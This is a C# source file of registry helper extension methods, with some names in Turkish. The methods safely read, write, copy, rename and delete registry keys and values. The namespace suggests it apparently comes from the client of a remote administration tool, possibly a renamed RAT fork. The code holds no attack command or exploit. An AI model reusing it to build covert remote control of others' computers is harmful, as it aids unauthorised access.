using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;

namespace xClient.KuuhakuÇekirdek.Eklentiler
{
    public static class KayıtDefteriAnahtarıEklentileri
    {
        private static bool IsNameOrValueNull(this string keyName, RegistryKey key)
        {
            return (string.IsNullOrEmpty(keyName) || (key == null));
        }

        public static string GetValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
        {
            try
            {
                return key.GetValue(keyName, defaultValue).ToString();
            }
            catch
            {
                return defaultValue;
            }
        }

        public static RegistryKey OpenReadonlySubKeySafe(this RegistryKey key, string name)
        {
            try
            {
                return key.OpenSubKey(name, false);
            }
            catch
            {
                return null;
            }
        }

        public static RegistryKey OpenWritableSubKeySafe(this RegistryKey key, string name)
        {
            try
            {
                return key.OpenSubKey(name, true);
            }
            catch
            {
                return null;
            }
        }

        public static RegistryKey CreateSubKeySafe(this RegistryKey key, string name)
        {
            try
            {
                return key.CreateSubKey(name);
            }
            catch
            {
                return null;
            }
        }

        public static bool DeleteSubKeyTreeSafe(this RegistryKey key, string name)
        {
            try
            {
                key.DeleteSubKeyTree(name, false);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static IEnumerable<string> GetFormattedKeyValues(this RegistryKey key)
        {
            if (key == null) yield break;

            foreach (
                var k in
                    key.GetValueNames()
                        .Where(keyVal => !keyVal.IsNameOrValueNull(key))
                        .Where(k => !string.IsNullOrEmpty(k)))
            {
                yield return string.Format("{0}||{1}", k, key.GetValueSafe(k));
            }
        }

        public static string RegistryTypeToString(this RegistryValueKind valueKind, object valueData)
        {
            switch (valueKind)
            {
                case RegistryValueKind.Binary:
                    return ((byte[]) valueData).Length > 0
                        ? BitConverter.ToString((byte[]) valueData).Replace("-", " ").ToLower()
                        : "(zero-length binary value)";
                case RegistryValueKind.MultiString:
                    return string.Join(" ", (string[]) valueData);
                case RegistryValueKind.DWord: //Convert with hexadecimal before int
                    return string.Format("0x{0} ({1})", ((uint) ((int) valueData)).ToString("X8").ToLower(),
                        ((uint) ((int) valueData)));
                case RegistryValueKind.QWord:
                    return string.Format("0x{0} ({1})", ((ulong) ((long) valueData)).ToString("X8").ToLower(),
                        ((ulong) ((long) valueData)));
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return valueData.ToString();
                case RegistryValueKind.Unknown:
                default:
                    return string.Empty;
            }
        }

        public static string RegistryTypeToString(this RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.Binary:
                    return "REG_BINARY";
                case RegistryValueKind.MultiString:
                    return "REG_MULTI_SZ";
                case RegistryValueKind.DWord:
                    return "REG_DWORD";
                case RegistryValueKind.QWord:
                    return "REG_QWORD";
                case RegistryValueKind.String:
                    return "REG_SZ";
                case RegistryValueKind.ExpandString:
                    return "REG_EXPAND_SZ";
                case RegistryValueKind.Unknown:
                    return "(Bilinmiyor)";
                default:
                    return "REG_NONE";
            }
        }

        public static object GetDefault(this RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.Binary:
                    return new byte[] {};
                case RegistryValueKind.MultiString:
                    return new string[] {};
                case RegistryValueKind.DWord:
                    return 0;
                case RegistryValueKind.QWord:
                    return (long) 0;
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return "";
                default:
                    return null;
            }
        }

        #region Rename Key

        public static bool RenameSubKeySafe(this RegistryKey key, string oldName, string newName)
        {
            try
            {
                key.CopyKey(oldName, newName);
                key.DeleteSubKeyTree(oldName);
                return true;
            }
            catch
            {
                key.DeleteSubKeyTreeSafe(newName);
                return false;
            }
        }

        public static void CopyKey(this RegistryKey key, string oldName, string newName)
        {
            using (var newKey = key.CreateSubKey(newName))
            {
                using (var oldKey = key.OpenSubKey(oldName, true))
                {
                    RecursiveCopyKey(oldKey, newKey);
                }
            }
        }

        private static void RecursiveCopyKey(RegistryKey sourceKey, RegistryKey destKey)
        {
            foreach (var valueName in sourceKey.GetValueNames())
            {
                var valueObj = sourceKey.GetValue(valueName);
                var valueKind = sourceKey.GetValueKind(valueName);
                destKey.SetValue(valueName, valueObj, valueKind);
            }
            foreach (var subKeyName in sourceKey.GetSubKeyNames())
            {
                using (var sourceSubkey = sourceKey.OpenSubKey(subKeyName))
                {
                    using (var destSubKey = destKey.CreateSubKey(subKeyName))
                    {
                        RecursiveCopyKey(sourceSubkey, destSubKey);
                    }
                }
            }
        }

        #endregion

        #region Region Value

        public static bool SetValueSafe(this RegistryKey key, string name, object data, RegistryValueKind kind)
        {
            try
            {
                key.SetValue(name, data, kind);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool DeleteValueSafe(this RegistryKey key, string name)
        {
            try
            {
                key.DeleteValue(name);
                return true;
            }
            catch
            {
                return false;
            }
        }

        #region Rename Value

        public static bool RenameValueSafe(this RegistryKey key, string oldName, string newName)
        {
            try
            {
                key.CopyValue(oldName, newName);
                key.DeleteValue(oldName);
                return true;
            }
            catch
            {
                key.DeleteValueSafe(newName);
                return false;
            }
        }

        public static void CopyValue(this RegistryKey key, string oldName, string newName)
        {
            var valueKind = key.GetValueKind(oldName);
            var valueData = key.GetValue(oldName);

            key.SetValue(newName, valueData, valueKind);
        }

        #endregion

        #endregion

        #region Find

        public static bool ContainsSubKey(this RegistryKey key, string name)
        {
            foreach (var subkey in key.GetSubKeyNames())
            {
                if (subkey == name)
                {
                    return true;
                }
            }
            return false;
        }

        public static bool ContainsValue(this RegistryKey key, string name)
        {
            foreach (var value in key.GetValueNames())
            {
                if (value == name)
                {
                    return true;
                }
            }
            return false;
        }

        #endregion
    }
}